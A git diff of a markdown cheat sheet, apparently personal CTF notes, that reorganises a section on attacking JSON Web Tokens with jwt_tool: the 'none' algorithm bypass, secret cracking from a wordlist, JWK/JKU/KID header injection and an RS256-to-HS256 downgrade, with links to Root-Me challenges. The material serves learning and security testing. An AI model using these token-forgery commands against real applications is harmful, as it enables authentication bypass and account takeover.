@@ -44,20 +44,10 @@ $ jwt_tool -h
 ```ps
 $ jwt_tool 'jwt'             # decode
 $ jwt_tool 'jwt' -T          # encode
+$ jwt_tool 'jwt' -I -pc claim -pv value
 ```
 
 You can also use [jwt.io](https://jwt.io/).
-
-#### None Algorithm
-
-[![jwt_introduction](../../../../_badges/rootme/web_server/jwt_introduction.svg)](https://www.root-me.org/en/Challenges/Web-Server/JWT-Introduction)
-
-We may be able to disable the tampering check by setting the signature algorithm to 'none.'
-
-```ps
-$ jwt_tool 'jwt' -T -X a     # attack 'algo=none'
-```
-</div><div>
 
 #### Secret Key Brute Forcing
 
@@ -70,22 +60,47 @@ $ jwt_tool 'jwt' -T -p "key" # use secret key
 $ jwt_tool 'jwt' -C -d /tmp/jwt.secrets.list # crack key
 ```
 
-#### JWK Header Injection
+#### JWT Header Injection — None Algorithm
+
+[![jwt_introduction](../../../../_badges/rootme/web_server/jwt_introduction.svg)](https://www.root-me.org/en/Challenges/Web-Server/JWT-Introduction)
+
+We may be able to disable the tampering check by setting the signature algorithm to 'none.'
+
+```ps
+$ jwt_tool 'jwt' -T -X a     # attack 'algo=none'
+```
+
+📚 It also possible for the signature to not be checked at all by the server after issuing a JWT even if there is an algorithm.
+</div><div>
+
+#### JWT Header Injection — JWK
 
 [![jwt_header_injection](../../../../_badges/rootme/web_server/jwt_header_injection.svg)](https://www.root-me.org/en/Challenges/Web-Server/JWT-Header-Injection)
 
+JWT may use the `jwk` header to represent the RSA key used to sign the data. We may be able to inject our own RSA key.
+
 ```ps
 $ jwt_tool 'jwt' -T -X i     # attack 'jwk header injection'
+                             # -hc kid -hv jwt_tool
 ```
 
-#### JWK Public Key
+#### JWT Header Injection — JKU
 
-When using RS256 algorithm, JWT uses the private key to edit data and the public key to verify integrity. We may be able to perform a downgrade attack to HS256 and only use a public key for both.
+The `jku` header contains a URL or a filename used to fetch a key.
+
+#### JWT Header Injection — KID
+
+The `kid` header may be added, such as the `jwk` object, to determine which key to use when there are multiple keys.
+
+#### JWT Header Injection — HS256
+
+[![jwt_unsecure_key_handling](../../../../_badges/rootme/web_server/jwt_unsecure_key_handling.svg)](https://www.root-me.org/en/Challenges/Web-Server/JWT-Unsecure-Key-Handling)
+
+When using RS256 algorithm, JWT uses the private key to sign the JWK and the public key to verify integrity. We may be able to perform a downgrade attack to HS256 and only use a public key for both.
 
 ```ps
 $ jwt_tool 'jwt' -S hs256 -k public.key -T
 ```
-
 </div></div>
 
 <hr class="sep-both">
